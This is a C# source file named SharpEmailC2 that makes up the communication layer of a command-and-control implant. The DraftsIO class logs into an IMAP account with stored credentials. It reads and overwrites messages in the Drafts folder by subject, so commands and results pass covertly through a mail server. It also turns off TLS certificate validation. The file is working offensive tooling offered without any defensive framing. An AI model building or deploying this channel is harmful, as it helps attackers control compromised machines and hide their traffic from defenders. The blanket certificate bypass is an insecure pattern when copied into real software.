using MailKit;
using MailKit.Net.Imap;
using MailKit.Search;
using MailKit.Security;
using MimeKit;
using System;

namespace SharpEmailC2
{
    public class DraftsIO
    {
        public static string Read(string subject)
        {
            // 邮箱配置信息
            string server = Constants.Host;
            int port = 993;
            string username = Constants.Username;
            string password = Constants.Password;


            int maxRetries = 5; // 最大重试次数
            int retryCount = 0; // 当前重试次数

            while (retryCount < maxRetries)
            {
                try
                {
                    // 连接到IMAP服务器
                    using (var client = new ImapClient())
                    {
                        client.ServerCertificateValidationCallback = (s, c, h, e) => true;
                        client.Connect(server, port, SecureSocketOptions.SslOnConnect);
                        client.Authenticate(username, password);

                        // 获取草稿箱文件夹
                        var drafts = client.GetFolder(SpecialFolder.Drafts);
                        drafts.Open(FolderAccess.ReadWrite);

                        // 读取草稿箱中的邮件
                        var results = drafts.Search(SearchQuery.All);

                        foreach (var uid in results)
                        {
                            var message = drafts.GetMessage(uid);
                            if (message.Subject == subject)
                            {
                                return message.TextBody;

                            }
                            else { }

                        }
                        client.Disconnect(true);
                        break;
                    }


                }

                catch (Exception ex)
                {
                    // 在catch块中捕获异常
                    // 可以在这里记录日志或执行其他处理逻辑

                    retryCount++;

                    if (retryCount >= maxRetries)
                    {
                        // 达到最大重试次数，无法继续重试，抛出异常
                        //throw;
                        Console.WriteLine("[!] Error:{0}", ex.Message);
                    }

                    // 等待一段时间后继续重试
                    //Thread.Sleep(1000); // 可以根据需要调整等待时间
                }

            }
            return null;
        }




        public static void Write(string subject, string body, int code)
        {
            // 邮箱配置信息
            string server = Constants.Host;
            int port = 993;
            string username = Constants.Username;
            string password = Constants.Password;

            // 连接到IMAP服务器
            using (var client = new ImapClient())
            {
                client.ServerCertificateValidationCallback = (s, c, h, e) => true;
                client.Connect(server, port, SecureSocketOptions.SslOnConnect);
                client.Authenticate(username, password);

                // 获取草稿箱文件夹
                var drafts = client.GetFolder(SpecialFolder.Drafts);
                drafts.Open(FolderAccess.ReadWrite);
                // 创建新的邮件
                if (code == 1)
                {
                    var newMessage = new MimeMessage();
                    newMessage.Subject = subject;
                    newMessage.Body = new TextPart("plain")
                    {
                        Text = body
                    };

                    // 将新邮件保存到草稿箱
                    drafts.Append(newMessage);
                }
                //不为1的时候仅修改邮件
                else
                {

                    // 搜索草稿箱中的邮件并修改
                    var results1 = drafts.Search(SearchQuery.All);

                    foreach (var uid in results1)
                    {

                        // 获取草稿的详细信息
                        var message = drafts.GetMessage(uid);

                        // 修改草稿
                        //message.Subject = "cs";
                        if (message.Subject == subject)
                        {
                            message.Body = new TextPart("plain")
                            {
                                Text = body
                            };

                            // 保存修改后的草稿
                            drafts.Replace(uid, message);
                        }
                    }
                }
                // 断开连接
                client.Disconnect(true);
            }
        }

    }
}